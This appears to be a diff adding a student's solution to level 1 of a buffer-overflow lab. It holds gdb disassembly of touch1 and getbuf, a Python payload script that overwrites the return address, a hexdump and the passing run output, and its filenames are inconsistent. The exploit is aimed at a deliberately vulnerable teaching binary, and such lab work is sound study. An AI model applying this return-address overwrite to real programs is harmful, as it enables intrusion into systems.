@@ -1,0 +1,44 @@
+Dump of assembler code for function touch1:
+   0x0000000000401877 <+0>:     sub    $0x8,%rsp
+   0x000000000040187b <+4>:     movl   $0x1,0x202c77(%rip)        # 0x6044fc <vlevel>
+   0x0000000000401885 <+14>:    mov    $0x403019,%edi
+   0x000000000040188a <+19>:    callq  0x400cd0 <puts@plt>
+   0x000000000040188f <+24>:    mov    $0x1,%edi
+   0x0000000000401894 <+29>:    callq  0x401c8c <validate>
+   0x0000000000401899 <+34>:    mov    $0x0,%edi
+   0x000000000040189e <+39>:    callq  0x400e40 <exit@plt>
+End of assembler dump.
+(gdb) disas getbuf
+Dump of assembler code for function getbuf:
+   0x0000000000401861 <+0>:     sub    $0x38,%rsp
+   0x0000000000401865 <+4>:     mov    %rsp,%rdi
+   0x0000000000401868 <+7>:     callq  0x401a99 <Gets>
+   0x000000000040186d <+12>:    mov    $0x1,%eax
+   0x0000000000401872 <+17>:    add    $0x38,%rsp
+   0x0000000000401876 <+21>:    retq
+
+// I solved this by creating a python file named payload1.py with the contents below 
+import sys
+
+touch1_address = b'\x77\x18\x40\x00\x00\x00\x00\x00'
+buffer_size = 56
+
+payload = b'A' * buffer_size
+payload += touch1_address
+sys.stdout.buffer.write(payload)
+
+I then ran it using 
+$python3 payload1.py > payloadfile1
+$hexdump -C payload _file1
+which generated
+00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
+*
+00000030  41 41 41 41 41 41 41 41  77 18 40 00 00 00 00 00  |AAAAAAAAw.@.....|
+00000040
+$ ./ctarget < payload_file1
+Cookie: 0x1a7dd803
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+
